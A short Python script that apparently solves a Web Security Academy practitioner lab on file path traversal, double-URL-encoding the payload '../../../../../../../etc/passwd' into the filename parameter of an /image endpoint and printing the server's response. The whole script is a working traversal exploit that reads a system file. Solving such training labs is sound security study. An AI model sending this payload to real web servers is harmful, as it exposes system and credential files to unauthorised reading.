# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
# difficulty: practitioner

import requests
from urllib.parse import quote

sub = '0a2f0052035e674b8648ca8b004500ac'
url = f'https://{sub}.web-security-academy.net'

def main():
    payload = quote('../../../../../../../etc/passwd', safe='')
    params = {'filename': payload}

    endpoint = '/image'
    r = requests.get(url + endpoint, params=params) # get url encoded once more
    print(r.text)
    print(f'payload => {r.url.split("?")[1]}')

if __name__ == '__main__':
    main()